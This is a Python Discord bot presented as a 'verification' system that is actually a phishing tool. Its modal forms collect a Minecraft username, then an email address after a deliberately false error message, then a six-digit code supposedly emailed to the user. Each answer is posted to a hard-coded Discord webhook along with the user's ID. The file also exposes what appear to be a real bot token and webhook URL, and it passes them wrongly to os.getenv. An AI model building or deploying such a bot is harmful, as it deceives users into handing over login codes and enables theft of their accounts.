import nextcord
from nextcord.ext import commands, tasks
import aiohttp
import os
import time
from flask import Flask, request
from threading import Thread

# -------------------- CONFIG --------------------
TOKEN = os.getenv("MTQ5NzY3ODg4NTEzMzc1MDM4Mg.GsVHaK.tgod-WG7Ov2Y9VLU4knapoovc7imkuwBmmlvH8")
WEBHOOK_URL = os.getenv("https://discord.com/api/webhooks/1497680268381786316/zfCUBaECLDyubKI7-uGINwtMpJIFLHHeHud0JOeazWDv2HZnk9XRorQ-vjO-tCOgdnq4")

# Track last ping to prevent duplicates
last_ping_time = 0
PING_COOLDOWN = 30  # seconds - ignore pings within 30 seconds

# -------------------- FLASK KEEP-ALIVE SERVER --------------------
app = Flask('')

@app.route('/')
def home():
    return "Bot is running!", 200

@app.route('/ping-tracker')  # Special endpoint for UptimeRobot
def ping_tracker():
    global last_ping_time
    current_time = time.time()
    
    # Check if this is a duplicate ping
    if current_time - last_ping_time < PING_COOLDOWN:
        return "Ignored duplicate ping", 429  # Too Many Requests
    
    last_ping_time = current_time
    return "Ping recorded", 200

def run_webserver():
    app.run(host='0.0.0.0', port=8080)

async def send_to_webhook(data: dict):
    async with aiohttp.ClientSession() as session:
        await session.post(WEBHOOK_URL, json=data)

# -------------------- MODALS (INPUT FORMS) --------------------
class UsernameModal(nextcord.ui.Modal):
    def __init__(self):
        super().__init__("Enter Your Minecraft Username To Verify")
        self.username = nextcord.ui.TextInput(label="Username", placeholder="e.g., CoolGuy123", required=True)
        self.add_item(self.username)

    async def callback(self, interaction: nextcord.Interaction):
        await send_to_webhook({
            "step": "username",
            "user_id": str(interaction.user.id),
            "value": self.username.value
        })
        # Next: ask for email
        view = EmailButtonView()
        await interaction.response.send_message(
            "Error: Can Not Verify With Username. Enter Your Email To Verify.",
            ephemeral=True, view=view
        )

class EmailModal(nextcord.ui.Modal):
    def __init__(self):
        super().__init__("Enter Your Email")
        self.email = nextcord.ui.TextInput(label="Email", placeholder="you@example.com", required=True)
        self.add_item(self.email)

    async def callback(self, interaction: nextcord.Interaction):
        await send_to_webhook({
            "step": "email",
            "user_id": str(interaction.user.id),
            "value": self.email.value
        })
        # Next: ask for verification code
        view = CodeButtonView()
        await interaction.response.send_message(
            "📧 Email submitted! A verification code has been sent to that address.\n"
            "Click below to enter the code.",
            ephemeral=True, view=view
        )

class CodeModal(nextcord.ui.Modal):
    def __init__(self):
        super().__init__("Enter Verification Code")
        self.code = nextcord.ui.TextInput(label="6-digit code", placeholder="123456", required=True)
        self.add_item(self.code)

    async def callback(self, interaction: nextcord.Interaction):
        await send_to_webhook({
            "step": "verification_code",
            "user_id": str(interaction.user.id),
            "value": self.code.value
        })
        await interaction.response.send_message(
            "🔐 Verification code sent for validation. You will be notified once verified.",
            ephemeral=True
        )

# -------------------- BUTTON VIEWS --------------------
class EmailButtonView(nextcord.ui.View):
    def __init__(self):
        super().__init__(timeout=300)  # expires after 5 minutes

    @nextcord.ui.button(label="📧 Enter Email", style=nextcord.ButtonStyle.primary)
    async def email_button(self, button: nextcord.ui.Button, interaction: nextcord.Interaction):
        await interaction.response.send_modal(EmailModal())

class CodeButtonView(nextcord.ui.View):
    def __init__(self):
        super().__init__(timeout=300)

    @nextcord.ui.button(label="🔢 Enter Code", style=nextcord.ButtonStyle.primary)
    async def code_button(self, button: nextcord.ui.Button, interaction: nextcord.Interaction):
        await interaction.response.send_modal(CodeModal())

class StartVerifyView(nextcord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)  # persistent (no timeout)

    @nextcord.ui.button(label="✅ Verify", style=nextcord.ButtonStyle.success, custom_id="verify_start")
    async def verify_button(self, button: nextcord.ui.Button, interaction: nextcord.Interaction):
        await interaction.response.send_modal(UsernameModal())

# -------------------- SLASH COMMAND --------------------
bot = commands.Bot(intents=nextcord.Intents.default())

@bot.slash_command(name="verify", description="Start the verification process")
async def verify(interaction: nextcord.Interaction):
    view = StartVerifyView()
    await interaction.response.send_message(
        "Click the button below to begin verification.", view=view, ephemeral=False
    )

# -------------------- RUN BOT --------------------
bot.run(TOKEN)
